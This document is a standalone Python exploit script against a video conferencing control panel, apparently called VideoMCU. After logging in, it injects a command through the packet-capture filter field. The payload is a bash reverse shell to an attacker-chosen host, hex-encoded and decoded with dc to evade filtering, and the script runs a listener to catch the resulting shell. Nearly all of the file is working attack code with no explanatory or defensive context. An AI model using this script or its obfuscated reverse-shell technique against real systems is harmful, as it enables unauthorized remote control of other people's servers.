#!/usr/bin/env python3
import requests
import sys
import telnetlib
import socket
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import binascii
import time 

def handler(lp): # handler borrowed from Stephen Seeley.
    print(f"[+] starting handler on port {lp}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[*] Got connection from {addr[0]}")
    t.sock = conn
    print("[$] Shell popped :P")
    t.interact()

def do_login(base_url, username, password):
    login_url = base_url + "/index.php"
    session = requests.Session()
    exploit_data = {'reserved_username': username,
    	            'reserved_password': password,
                    'Login': 'Login'}
    try:
        print("[+] Attempting to log into VideoMCU...")
        f = session.post(url=login_url, data=exploit_data, verify=False, allow_redirects=False)
    except:
        print("[-] oh no it went wrong, sorry, good luck debugging")
        sys.exit(0)
    if (f.status_code == 302 and f.headers['Location'] == '/SAFe/sng_control_panel'):
        return session
    else:
        return None

def do_remote_exec(base_url, session, command):
    target_url = base_url + '/admin/sng_capture.php'
    injection = f"$({command})"
    exploit_data = {"filter": injection,
                    "interface": "eth0",
                    "capture-eth": "Capture"}
    headers = {"Referer": target_url}
    exp = session.post(url=target_url, data=exploit_data, headers=headers, verify=False)

def dc_encoder(reverse_shell):
    hexadecimals = binascii.hexlify(reverse_shell.encode('ascii'))
    hexadecimals = hexadecimals.upper()
    wrapper = f"echo '16i {hexadecimals.decode('ascii')} P' | dc | sh"
    print(wrapper)
    return wrapper

def exp(base_url, cb_host, cb_port, username, password):
    session = do_login(base_url, username, password)
    if session is None:
        sys.exit("[-] Authentication failure, bailing...")
    print("[*] Auth succeeded, we can proceed...")
    reverse_shell = f"nohup bash -c 'bash -i >& /dev/tcp/{cb_host}/{cb_port} 0>&1 &'"
    encoded_reverse_shell = dc_encoder(reverse_shell)
    print(f"[*] Using {cb_host}:{cb_port} for connectback...")
    handlerthr = Thread(target=handler, args=(int(cb_port),))
    handlerthr.start()
    print("[+] Doing the command injection...")
    do_remote_exec(base_url, session, encoded_reverse_shell)

def main(args):
    if len(args) != 6:
        sys.exit("use: %s https://some-mcu.lol:81 hacke.rs 1337 username password" %(args[0]))
    exp(base_url=args[1], cb_host=args[2], cb_port=args[3], username=args[4], password=args[5])

if __name__ == "__main__":
    main(args=sys.argv)
